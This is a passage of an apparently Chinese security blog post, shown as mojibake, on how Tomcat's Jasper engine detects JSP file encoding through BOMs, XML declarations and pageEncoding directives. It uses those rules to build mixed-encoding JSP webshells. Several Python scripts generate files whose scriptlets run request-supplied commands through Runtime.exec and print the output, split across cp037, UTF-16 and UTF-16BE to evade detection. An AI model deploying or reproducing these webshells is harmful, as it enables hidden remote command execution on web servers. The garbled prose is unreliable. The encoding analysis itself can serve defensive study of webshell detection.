¹æ®ä¸€å®šè§„åˆ™æ‹¼æ¥åˆ°ä¸€ä¸ªjavaæ–‡ä»¶åæœ€ç»ˆä¼šç¼–è¯‘ä¸ºä¸€ä¸ªclassæ–‡ä»¶å¹¶åŠ è½½ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­å°±æ¶‰åŠçš„å¾ˆå¤šè§£æçš„è¿‡ç¨‹ï¼Œè¿™é‡Œç”±äºä¸»é¢˜é™åˆ¶ï¼Œæˆ‘ä»¬ä¸å¿…å¤ªè¿‡å…³å¿ƒï¼Œæˆ‘ä»¬é‡ç‚¹åå‘äºå»äº†è§£å®ƒçš„ç¼–ç æ˜¯å¦‚ä½•è¢«è¯†åˆ«çš„å³å¯. å¯¹äºè¿™éƒ¨åˆ†å¤„ç†é€»è¾‘å…¶å®æ˜¯ç”±org.apache.jasper.compiler.ParserController#determineSyntaxAndEncodingåšå¤„ç†ï¼Œåœ¨è¿™ä¸ªç±»æ–¹æ³•å½“ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„å±æ€§isXmlä¸sourceEncï¼Œå­—é¢ç†è§£å°±èƒ½å¾—å‡ºä¸€ä¸ªåˆ¤å®šæ˜¯å¦jspæ ¼å¼æ˜¯é€šè¿‡xmlæ ¼å¼ç¼–å†™ï¼Œå¦ä¸€ä¸ªsourceEncä¹Ÿå°±å†³å®šç€jspæ–‡ä»¶çš„ç¼–ç ç›¸å…³ å…³äºxmlæ ¼å¼çš„ä¸€äº›ç®€å•è¯´æ˜xmlå£°æ˜è¿™é‡Œæˆ‘ä»¬æˆ‘ä»¬åªéœ€è¦çŸ¥é“encodingå±æ€§å¯ä»¥å†³å®šå†…å®¹ç¼–ç å³å¯ tomcatå¯¹äºxmlæ ¼å¼è¿˜ç®—æ¯”è¾ƒä¸¥æ ¼ï¼Œå…¶ä¸­å¦‚æœéœ€è¦ç”¨åˆ°xmlå£°æ˜&lt;?xmlè¦æ±‚â€œå¿…é¡»â€åœ¨é¦–ä½ï¼Œè¯´æ˜ä¸‹è¿™é‡Œçš„å¿…é¡»æŒ‡çš„æ˜¯éœ€è¦è§£æå¹¶è·å–è¿™ä¸ªæ ‡ç­¾ä¸­çš„å±æ€§ï¼Œæ¯”å¦‚encodingå°±å†³å®šç€åç»­å†…å®¹çš„ç¼–ç ï¼Œæˆ‘ä»¬éœ€è¦å®ƒç”Ÿæ•ˆå°±éœ€è¦å°†è¿™ä¸ªxmlå£°æ˜æ”¾ç½®åœ¨æ–‡ä»¶å†…å®¹æœ€å‰é¢(Psï¼šè¿™é‡Œçš„æœ€å‰é¢æŒ‡çš„æ˜¯è¢«è§£ç åçš„å­—ç¬¦åœ¨æ–‡ä»¶æœ€å‰é¢ï¼Œå¹¶ä¸æ˜¯ä¸€å®šè¦æ±‚æ˜¯åŸç”Ÿçš„å­—ç¬¦ä¸²&lt;?xml)ï¼Œå½“ç„¶å¦‚æœä¸éœ€è¦å…¶å®è¿™é‡Œå°±ä¸å¤ªé‡è¦äº† 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; å¦‚æœä¸ªäººæ¯”è¾ƒå¥½å¥‡è¿™éƒ¨åˆ†ä»£ç é€»è¾‘å¯ä»¥è‡ªè¡Œçœ‹çœ‹org.apache.jasper.xmlparser.XMLEncodingDetector#getEncoding(java.io.InputStream, org.apache.jasper.compiler.ErrorDispatcher) å¦‚ä½•è¯†åˆ«æˆ‘ä»¬çš„æ–‡ä»¶å†…å®¹æ˜¯xmlæ ¼å¼æ¥ä¸‹æ¥å†æ¥ç®€å•è¯´è¯´æ˜¯å¦‚ä½•è¯†åˆ«æˆ‘ä»¬çš„æ–‡ä»¶æ˜¯xmlæ ¼å¼çš„å‘¢ï¼Ÿ é¦–å…ˆæ˜¯æ ¹æ®åç¼€å.jspxæˆ–.tagxï¼Œå½“ç„¶è¿™ä¿©ä¸åœ¨æˆ‘ä»¬ä»Šå¤©è®¨è®ºçš„èŒƒå›´å†… å¦‚æœåç¼€åä¸ç¬¦åˆåˆ™æ ¹æ®æ–‡æœ¬å†…å®¹æ˜¯å¦åŒ…å«æœ‰å½¢å¦‚&lt;xxx:rootæ ¼å¼çš„æ–‡æœ¬ï¼Œå¦‚æœæœ‰ä¹Ÿä¼šè¯†åˆ«ä¸ºä¸€ä¸ªxmlæ ¼å¼ å¦‚ä½•å†³å®šä¸€ä¸ªæ–‡ä»¶çš„ç¼–ç å¦‚ä½•ä»å­—èŠ‚é¡ºåºæ ‡è®°(BOM)åˆ¤æ–­æ–‡æœ¬å†…å®¹ç¼–ç ç®€å•æ¥è¯´è¿™éƒ¨åˆ†é€»è¾‘å…¶å®å’ŒW3Cæ‰€å®šä¹‰çš„ä¸€è‡´ W3Cå®šä¹‰äº†ä¸‰æ¡XMLè§£æå™¨å¦‚ä½•æ­£ç¡®è¯»å–XMLæ–‡ä»¶çš„ç¼–ç çš„è§„åˆ™ï¼š 1.å¦‚æœæ–‡æŒ¡æœ‰BOM(å­—èŠ‚é¡ºåºæ ‡è®°)ï¼Œå°±å®šä¹‰äº†æ–‡ä»¶ç¼–ç  2.å¦‚æœæ²¡æœ‰BOMï¼Œå°±æŸ¥çœ‹XML encodingå£°æ˜çš„ç¼–ç å±æ€§ 3.å¦‚æœä¸Šè¿°ä¸¤ä¸ªéƒ½æ²¡æœ‰ï¼Œå°±å‡å®šXMLæ–‡æŒ¡é‡‡ç”¨UTF-8ç¼–ç  æˆ‘ä»¬çš„tomcatå¯¹è¿™éƒ¨åˆ†å®ç°ä¹Ÿæ˜¯æ‰‹å†™æ ¹æ®æ–‡ä»¶å‰4ä¸ªå­—èŠ‚(BOM)æ¥å†³å®šæ–‡ä»¶çš„ç¼–ç (org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding) å…·ä½“æ˜¯é€šè¿‡å‡½æ•°XMLEncodingDetector#getEncodingæ¥åŠ¨æ€å†³å®šç¼–ç  12345678910111213private Object[] getEncoding(InputStream in, ErrorDispatcher err) throws IOException, JasperException&#123; this.stream = in; this.err=err; createInitialReader(); scanXMLDecl(); return new Object[] &#123; this.encoding, Boolean.valueOf(this.isEncodingSetInProlog), Boolean.valueOf(this.isBomPresent), Integer.valueOf(this.skip) &#125;;&#125; åœ¨è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®å‡½æ•°ï¼Œå®ƒä»¬éƒ½èƒ½å†³å®šæ•´ä¸ªæ–‡ä»¶å†…å®¹çš„ç¼–ç  12createInitialReader();scanXMLDecl(); å…¶ä¸­createInitialReaderä½œç”¨æœ‰ä¸¤ä¸ªä¸€ä¸ªæ˜¯æ ¹æ®å‰å››ä¸ªå­—èŠ‚(bom)å†³å®šencodingä¹Ÿå°±æ˜¯ç¼–ç ï¼Œæ¥ç€å¾€é‡Œçœ‹åœ¨org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingNameä¸­ é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯æ ¹æ®å‰4ä¸ªå­—èŠ‚é¡ºåºæ ‡è®°åˆ¤å®šæ–‡ä»¶ç¼–ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152private Object[] getEncodingName(byte[] b4, int count) &#123; if (count &lt; 2) &#123; return new Object[]&#123;&quot;UTF-8&quot;, null, Boolean.FALSE, Integer.valueOf(0)&#125;; &#125; int b0 = b4[0] &amp; 0xFF; int b1 = b4[1] &amp; 0xFF; if (b0 == 0xFE &amp;&amp; b1 == 0xFF) &#123; return new Object [] &#123;&quot;UTF-16BE&quot;, Boolean.TRUE, Integer.valueOf(2)&#125;; &#125; if (b0 == 0xFF &amp;&amp; b1 == 0xFE) &#123; return new Object [] &#123;&quot;UTF-16LE&quot;, Boolean.FALSE, Integer.valueOf(2)&#125;; &#125; if (count &lt; 3) &#123; return new Object [] &#123;&quot;UTF-8&quot;, null, Boolean.FALSE, Integer.valueOf(0)&#125;; &#125; int b2 = b4[2] &amp; 0xFF; if (b0 == 0xEF &amp;&amp; b1 == 0xBB &amp;&amp; b2 == 0xBF) &#123; return new Object [] &#123;&quot;UTF-8&quot;, null, Integer.valueOf(3)&#125;; &#125; if (count &lt; 4) &#123; return new Object [] &#123;&quot;UTF-8&quot;, null, Integer.valueOf(0)&#125;; &#125; int b3 = b4[3] &amp; 0xFF; if (b0 == 0x00 &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x3C) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, Boolean.TRUE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x3C &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, Boolean.FALSE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x00 &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x3C &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, null, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x00 &amp;&amp; b1 == 0x3C &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, null, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x00 &amp;&amp; b1 == 0x3C &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x3F) &#123; return new Object [] &#123;&quot;UTF-16BE&quot;, Boolean.TRUE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x3C &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x3F &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;UTF-16LE&quot;, Boolean.FALSE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x4C &amp;&amp; b1 == 0x6F &amp;&amp; b2 == 0xA7 &amp;&amp; b3 == 0x94) &#123; return new Object [] &#123;&quot;CP037&quot;, null, Integer.valueOf(4)&#125;; &#125; return new Object [] &#123;&quot;UTF-8&quot;, null, Boolean.FALSE, Integer.valueOf(0)&#125;; &#125; createInitialReaderå¦ä¸€ä¸ªä½œç”¨å°±æ˜¯åˆå§‹åŒ–Readerå¯¹è±¡(reader = createReader(stream, encoding, isBigEndian))ï¼Œåœ¨Readeré‡Œé¢å¸¦æœ‰æˆ‘ä»¬å¯¹æ–‡ä»¶ç¼–ç ä»¥åŠå­—èŠ‚åºåˆ—å¤§å°ç«¯çš„å…³é”®ä¿¡æ¯ï¼Œä¸ºä¸‹ä¸€æ­¥è°ƒç”¨scanXMLDeclæ‰«æè§£æxmlçš„ç”³æ˜å†…å®¹åšäº†ä¸€ä¸ªå‰ç½®å‡†å¤‡ï¼Œåœ¨scanXMLDeclå½“ä¸­æˆ‘ä»¬å…¶å®åªéœ€è¦å…³æ³¨å’Œç¼–ç ç›¸å…³çš„å±æ€§(Ps:å…·ä½“é€»è¾‘å¯ä»¥è‡ªå·±çœ‹çœ‹ä»£ç ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œç›¸å…³åº¦ä¸é«˜ä¸å¤šæ)ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢xmlå°èŠ‚é‡Œé¢æåˆ°çš„ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; è¿™é‡Œé¢xmlå±æ€§çš„encodingä¹Ÿå¯ä»¥å†³å®šæ•´ä¸ªæ–‡ä»¶çš„ç¼–ç å†…å®¹ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªencodingå¯ä»¥è¦†ç›–æ‰ä¸Šä¸€æ­¥çš„å‡½æ•°createInitialReader();(é€šè¿‡å‰å››å­—èŠ‚è¯†åˆ«å‡ºçš„ç¼–ç è¯†åˆ«çš„encoding)ï¼Œå› æ­¤é…åˆè¿™ä¸ªæˆ‘ä»¬ä¹Ÿå¯ä»¥æ„é€ å‡ºä¸€ç§æ–°çš„åŒç¼–ç jspwebshellï¼Œæœ€åä¼šæåˆ° æ— æ³•æ ¹æ®å‰å››ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡æœ¬ç¼–ç æ€ä¹ˆåŠå½“æ— æ³•æ ¹æ®å‰å››ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡æœ¬ç¼–ç æ—¶ï¼Œjspè¿˜æä¾›äº†å¦ä¸€ç§æ–¹å¼å¸®åŠ©è¯†åˆ«ç¼–ç ï¼Œå¯¹åº”ä¸‹å›¾ä¸­çš„getPageEncodingForJspSyntax æœ‰å…´è¶£çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051private String getPageEncodingForJspSyntax(JspReader jspReader, Mark startMark) throws JasperException &#123; String encoding = null; String saveEncoding = null; jspReader.reset(startMark); while (true) &#123; if (jspReader.skipUntil(&quot;&lt;&quot;) == null) &#123; break; &#125; if (jspReader.matches(&quot;%--&quot;)) &#123; if (jspReader.skipUntil(&quot;--%&gt;&quot;) == null) &#123; break; &#125; continue; &#125; boolean isDirective = jspReader.matches(&quot;%@&quot;); if (isDirective) &#123; jspReader.skipSpaces(); &#125; else &#123; isDirective = jspReader.matches(&quot;jsp:directive.&quot;); &#125; if (!isDirective) &#123; continue; &#125; if (jspReader.matches(&quot;tag &quot;) || jspReader.matches(&quot;page&quot;)) &#123; jspReader.skipSpaces(); Attributes attrs = Parser.parseAttributes(this, jspReader); encoding = getPageEncodingFromDirective(attrs, &quot;pageEncoding&quot;); if (encoding != null) &#123; break; &#125; encoding = getPageEncodingFromDirective(attrs, &quot;contentType&quot;); if (encoding != null) &#123; saveEncoding = encoding; &#125; &#125; &#125; if (encoding == null) &#123; encoding = saveEncoding; &#125; return encoding; &#125; è¯¾ä»£è¡¨ç›´æ¥æ€»ç»“äº†ï¼Œç®€å•æ¥è¯´æœ€ç»ˆå…¶å®å°±æ˜¯æ ¹æ®æ–‡æœ¬å†…å®¹ä¸­çš„pageEncodingçš„å€¼æ¥å†³å®šæœ€ç»ˆç¼–ç ï¼Œè¿™é‡Œæœ‰ä¸¤ç§å†™æ³• ç¬¬ä¸€ç§ 1234567&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;æˆ–&lt;%@ page contentType=&quot;charset=utf-16be&quot; %&gt;æˆ–&lt;%@ tag language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;æˆ–&lt;%@ tag contentType=&quot;charset=utf-16be&quot; %&gt; ç¬¬äºŒç§ 1234567&lt;jsp:directive.page pageEncoding=&quot;utf-16be&quot;/&gt;æˆ–&lt;jsp:directive.page contentType=&quot;charset=utf-16be&quot;/&gt;æˆ–&lt;jsp:directive.tag pageEncoding=&quot;utf-16be&quot;/&gt;æˆ–&lt;jsp:directive.tag contentType=&quot;charset=utf-16be&quot;/&gt; åŒæ—¶å¦‚æœä½¿ç”¨çš„pageåé¢å¯ä»¥ä¸éœ€è¦ç©ºæ ¼,ä¹Ÿå°±æ˜¯å½¢å¦‚&lt;%@ pagepageEncoding=&quot;utf-16be&quot; %&gt;æˆ–&lt;jsp:directive.pagepageEncoding=&quot;utf-16be&quot;/&gt;å…·ä½“å¯ä»¥çœ‹çœ‹ä»£ç çš„è§£æè¿™éƒ¨åˆ†ä¸é‡è¦ å› æ­¤çœ‹åˆ°è¿™é‡Œä½ å°±çŸ¥é“ä¸ºä»€ä¹ˆå¼€å¤´æåˆ°çš„phithonæä¾›çš„demoèƒ½å¤ŸæˆåŠŸè§£æçš„åŸå› äº† ç¬¬äºŒç§ ç¬¬ä¸‰ç§ ä¸ºä»€ä¹ˆä¸Šé¢è¿™ä¸ªæœ‰ä¸€å®šå±€é™æ€§å®é™…ä¸Šå¦‚æœä½ è®¤çœŸçœ‹äº†ä¸Šé¢çš„ä»£ç ä½ ä¼šå‘ç°å†³å®šå…·ä½“ä»£ç é€»è¾‘æ˜¯å¦èƒ½èµ°åˆ°è¿™ä¸€æ­¥å’ŒisBomPresentçš„å€¼å¯†ä¸å¯åˆ†ï¼Œæˆ‘ä»¬ä¹Ÿè¯´åˆ°äº†åªæœ‰æ–‡ä»¶å‰å››ä¸ªå­—èŠ‚æ— æ³•ä¸org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingNameè¿™ä¸ªæ–¹æ³•ä¸­æŸä¸ªç¼–ç åŒ¹é…ï¼Œä¹‹åå‡å®šXMLæ–‡æŒ¡é‡‡ç”¨UTF-8ç¼–ç ï¼Œæœ€ç»ˆæ‰èƒ½ä¿è¯isBomPresentä¸ºfalseï¼Œå› æ­¤è¿™ç§åˆ©ç”¨çš„å±€é™æ€§åœ¨äºæ–‡ä»¶å¤´åªèƒ½æ˜¯utf8æ ¼å¼æ‰èƒ½ä¿è¯ä»£ç é€»è¾‘çš„æ­£ç¡®æ‰§è¡Œ æ›´çµæ´»çš„åŒç¼–ç jspwebshellæ ¹æ®æˆ‘ä»¬å‰é¢çš„åˆ†æï¼Œä¸‹é¢è¿™ç§æ–¹å¼å®ç°åŒç¼–ç ä¼šæ›´çµæ´»ï¼Œå¯ä»¥æ›´å¤šæ ·åœ°é€‰æ‹©åŒç¼–ç é—´çš„ç»„åˆ è¿™é‡Œç®€å•å†™ä¸ªpythonç”Ÿæˆä¸€ä¸ªå³å¯ä½œä¸ºæ¼”ç¤º 12345678910111213141516171819202122a0 = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;a1 = &#x27;&#x27;&#x27;&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt; &lt;jsp:directive.page contentType=&quot;text/html&quot;/&gt; &lt;jsp:declaration&gt; &lt;/jsp:declaration&gt; &lt;jsp:scriptlet&gt;Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));String line = &quot;&quot;;while ((line = input.readLine()) != null) &#123; out.write(line+&quot;\\\\n&quot;);&#125;&lt;/jsp:scriptlet&gt; &lt;jsp:text&gt; &lt;/jsp:text&gt;&lt;/jsp:root&gt;&#x27;&#x27;&#x27;with open(&quot;test.jsp&quot;,&quot;wb&quot;) as f: f.write(a0.encode(&quot;utf-16&quot;)) f.write(a1.encode(&quot;cp037&quot;)) ç®€å•æµ‹è¯•æ²¡æ¯›ç—… è®¿é—®æµ‹è¯• å¤šè¯´ä¸€ä¸‹è¿™é‡Œä¹Ÿåªæ˜¯ç›¸å¯¹çµæ´»ï¼Œä»æ‰§è¡Œé€»è¾‘æ¥çœ‹å¿…é¡»è¦æ˜¯XMLEncodingDetector#getEncodingNameèƒ½å¤Ÿè¯†åˆ«çš„èŒƒå›´æ‰è¡Œï¼Œå› æ­¤åœ¨æˆ‘è¿™ä¸ªç‰ˆæœ¬ä¸­å…¶å®å¯¹åº”ç€UTF-8\\UTF-16BE\\UTF-16LE\\ISO-10646-UCS-4\\CP037ä½œä¸ºå‰ç½®ç¼–ç ï¼Œå½“ç„¶åç½®å°±æ— æ‰€è°“å•¦åŸºæœ¬ä¸Šjavaä¸­çš„éƒ½è¡Œ é¿å…åŒç¼–ç è¸©å‘è¿™é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆå¤§çš„å‘ï¼ä»€ä¹ˆå‘å‘¢ï¼Ÿ è¿™é‡Œæˆ‘ä»¬ä»¥å‰ç½®cp037+åç½®utf-16ä¸ºä¾‹è¿›è¡Œè¯´æ˜ æˆ‘ä»¬çœ‹çœ‹å‰ç½®éƒ¨åˆ†ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨å†™å‰ç½®éƒ¨åˆ†çš„æ—¶å€™ä¸ä¼šåœ¨æ„å…¶é•¿åº¦ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç è¾“å‡ºé•¿åº¦ä¸º41ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå·¨å¤§çš„å‘ç‚¹ï¼ 12a0 = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;utf-16be&#x27;?&gt;&#x27;&#x27;&#x27;print(len(a0.encode(&quot;cp037&quot;))) ä¸ºä»€ä¹ˆï¼Ÿæˆ‘ä»¬å‰é¢è¯´è¿‡åœ¨åé¢é€šè¿‡æ–‡ä»¶å†…å®¹åˆ¤æ–­æ˜¯å¦ä¸ºxmlæ ¼å¼æ—¶ï¼Œæ˜¯é€šè¿‡æ£€æŸ¥é‡Œé¢æ˜¯å¦å«æœ‰&lt;xxx:rootè¿™æ ·çš„ä»£ç ç‰‡æ®µæ¥è¿›è¡Œåˆ¤æ–­ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹çœ‹çº¢è‰²ç®­å¤´ï¼Œè¿™é‡Œæ˜¯ç›´æ¥æŠŠæ•´ä¸ªæ–‡ä»¶å†…å®¹æ”¾åœ¨jspReaderå½“ä¸­åšè§£ç  è¿™æ„å‘³ç€ä»€ä¹ˆï¼Œæˆ‘ä»¬åˆšåˆšè¯´äº†å‰é¢éƒ¨åˆ†é•¿åº¦æ˜¯å•æ•°ï¼Œè€Œå¯¹äºæˆ‘ä»¬çš„utf-16æ˜¯ä¸¤ä¸ªå­—èŠ‚å»è§£ç ï¼Œè¿™å°±å¯¼è‡´ æœ¬æ¥è¿™é‡Œåº”è¯¥æ˜¯003cä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œç”±äºå‰é¢c3p0ç¼–ç åé•¿åº¦ä¸ºå•æ•°ï¼Œå¯¼è‡´æœ€ç»ˆä¸º3c00å»åšäº†è§£ç ï¼Œå› æ­¤æœ€ç»ˆå¯¼è‡´è¯†åˆ«ä¸åˆ°&lt;xxx:rootè¿™æ ·çš„ä»£ç ç‰‡æ®µï¼Œå°±å¯¼è‡´ç¨‹åºè®¤ä¸ºè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªxmlæ ¼å¼çš„å†™æ³• æœ€ç»ˆåœ¨org.apache.jasper.compiler.ParserController#doParseåšè§£æå¹¶æ‹¼æ¥jspæ¨¡æ¿çš„æ—¶å€™æ— æ³•æˆä¸ºæ­£ç¡®çš„ä»£ç ï¼Œè€Œè¯†åˆ«ä¸åˆ°æ­£ç¡®çš„æ ¼å¼å°±å¯¼è‡´æ‰§è¡Œä¸‹é¢åˆ†æ”¯å‡ºé”™ï¼ŒåŸæœ¬è¯¥æ˜¯æ‰§è¡Œçš„ä»£ç å˜æˆäº†ä¸€å †ä¹±ç æ˜¾ç¤ºåˆ°é¡µé¢ä¸­(æœ‰å…´è¶£å¯ä»¥çœ‹çœ‹ä¸‹é¢)è¿™ä¸ªåˆ†æ”¯ä¸­å…·ä½“çš„è§£ææµç¨‹ä¹Ÿè›®æœ‰æ„æ€) ä»»æ„æ”¾ç½®çš„jspReader.matchesä¸%@åˆšåˆšæˆ‘ä»¬åªæåˆ°äº†è¿™ä¸¤ä¸ªæ ‡ç­¾çš„åˆ©ç”¨å…·æœ‰ç¼–ç çš„å±€é™æ€§ï¼Œç„¶è€Œå¦‚æœä½ å†ä»”ç»†çœ‹æˆ‘ä»¬åé¢æå‡ºçš„ä¸¤ç§æ–°çš„ç¼–ç åˆ©ç”¨ä¼šå‘ç°åœ¨å‡½æ•°getPageEncodingForJspSyntaxä¸­ï¼Œå®ƒé€šè¿‡whileå¾ªç¯ä¸æ–­å¾€åæŸ¥æ‰¾ç¬¦å·&lt;ï¼Œä¹‹ååœ¨è°ƒç”¨jspReader.matcheså¯»æ‰¾%@æˆ–jsp:directive. 123456789101112131415161718192021222324private String getPageEncodingForJspSyntax(JspReader jspReader, Mark startMark) throws JasperException &#123; xxxx while (true) &#123; if (jspReader.skipUntil(&quot;&lt;&quot;) == null) &#123; break; &#125; xxxx boolean isDirective = jspReader.matches(&quot;%@&quot;); if (isDirective) &#123; jspReader.skipSpaces(); &#125; else &#123; isDirective = jspReader.matches(&quot;jsp:directive.&quot;); &#125; if (!isDirective) &#123; continue; &#125; xxxx &#125; å› æ­¤ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡º&lt;jsp:directive.æˆ–&lt;%@å¹¶æ²¡æœ‰è¦æ±‚åœ¨æŸä¸ªå…·ä½“çš„ä½ç½®ï¼Œå› æ­¤å®ƒå¯ä»¥åœ¨æœ€å‰é¢ï¼Œå¯ä»¥åœ¨ä¸­é—´ç”šè‡³å¯ä»¥åœ¨æœ€åé¢ è¿™é‡Œæˆ‘ä»¬å¯ä»¥éªŒè¯ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬æŠŠå®ƒè—åœ¨äº†ä¸€ä¸ªå˜é‡å½“ä¸­ æµ‹è¯•demo 1234567891011121314a0 = &#x27;&#x27;&#x27;&lt;% Process p = Runtime.getRuntime().exec(request.getParameter(&quot;y4tacker&quot;)); java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String line = &quot;&#x27;&#x27;&#x27;a1 = &#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;a2 = &#x27;&#x27;&#x27;&quot;; while ((line = input.readLine()) != null) &#123; out.write(line+&quot;\\\\n&quot;); &#125;%&gt;&#x27;&#x27;&#x27;with open(&quot;test2.jsp&quot;,&quot;wb&quot;) as f: f.write(a0.encode(&quot;utf-16be&quot;)) f.write(a1.encode(&quot;utf-8&quot;)) f.write(a2.encode(&quot;utf-16be&quot;)) æˆåŠŸåˆ©ç”¨ ä¸‰é‡ç¼–ç åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šæˆ‘ä»¬è¿˜å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“å®ƒåœ¨è¯†åˆ«æ ‡ç­¾&lt;jsp:directive.æˆ–&lt;%@çš„è¿‡ç¨‹ä¸­æ˜¯è°ƒç”¨äº†jspReader.xxxå»å®ç°çš„ï¼Œè€Œè¿™ä¸ªjspReaderæ¥æºäºå‰é¢çš„è°ƒç”¨ 123456JspReader jspReader = null;try &#123; jspReader = new JspReader(ctxt, absFileName, sourceEnc, jar, err);&#125; catch (FileNotFoundException ex) &#123; throw new JasperException(ex);&#125; èªæ˜çš„ä½ ä¸€å®šèƒ½çœ‹å‡ºè¿™é‡Œçš„sourceEncæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„(å‰é¢è®²è¿‡äº†å¿˜äº†å¾€ä¸Šç¿»å¤ä¹ ä¸‹) å› æ­¤æˆ‘ä»¬å¯¹æ•´ä¸ªåˆ©ç”¨æ¢³ç†ä¸€ä¸‹ ä¿è¯æ— æ³•é€šè¿‡BOMè¯†åˆ«å‡ºæ–‡æœ¬å†…å®¹ç¼–ç (ä¿è¯isBomPresentä¸ºfalse) é€šè¿‡&lt;?xml encoding=&#39;xxx&#39;å¯ä»¥æ§åˆ¶sourceEncçš„å€¼ å°†æ ‡ç­¾&lt;jsp:directive.æˆ–&lt;%@æ”¾ç½®åœ¨å…¨æ–‡ä»»æ„ä½ç½®ä½†ä¸å½±å“ä»£ç è§£æ é€šè¿‡æ ‡ç­¾&lt;jsp:directive.æˆ–&lt;%@çš„pageEncodingå±æ€§å†æ¬¡æ›´æ”¹æ–‡æœ¬å†…å®¹ç¼–ç  è¿™é‡Œæˆ‘æŒ‰è¦æ±‚éšä¾¿å†™äº†ä¸€ä¸ªç¬¦åˆçš„ä¾‹å­ 12345678910111213141516a0 = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;a1 = &#x27;&#x27;&#x27;&lt;% Process p = Runtime.getRuntime().exec(request.getParameter(&quot;y4tacker&quot;)); java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String line = &quot;&#x27;&#x27;&#x27;a2 = &#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;a3 = &#x27;&#x27;&#x27;&quot;; while ((line = input.readLine()) != null) &#123; out.write(line+&quot;\\\\n&quot;); &#125;%&gt;&#x27;&#x27;&#x27;with open(&quot;test3.jsp&quot;,&quot;wb&quot;) as f: f.write(a0.encode(&quot;utf-8&quot;)) f.write(a1.encode(&quot;utf-16be&quot;)) f.write(a2.encode(&quot;cp037&quot;)) f.write(a3.encode(&quot;utf-16be&quot;)) ç”Ÿæˆä¸‰é‡ç¼–ç æ–‡ä»¶ æµ‹è¯•åˆ©ç”¨ å…¶ä»–å…¶å®åœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­è¿˜é¡ºä¾¿å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œè™½ç„¶å’Œè®²ç¼–ç çš„ä¸»é¢˜æ— å…³ï¼Œä½†ä¸ªäººè§‰å¾—æ¯”è¾ƒæœ‰æ„æ€å°±é¡ºä¾¿æ”¾åœ¨æœ€åäº†ï¼Œå¯¹äºjspä¸åŒçš„éƒ¨åˆ†å¯¹åº”çš„ç©ºæ ¼åˆ¤å®šæ˜¯ä¸åŒçš„ æ¯”å¦‚åœ¨å¯¹xmlæ–‡ä»¶å¤´åšè§£æçš„æ—¶å€™(&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;) 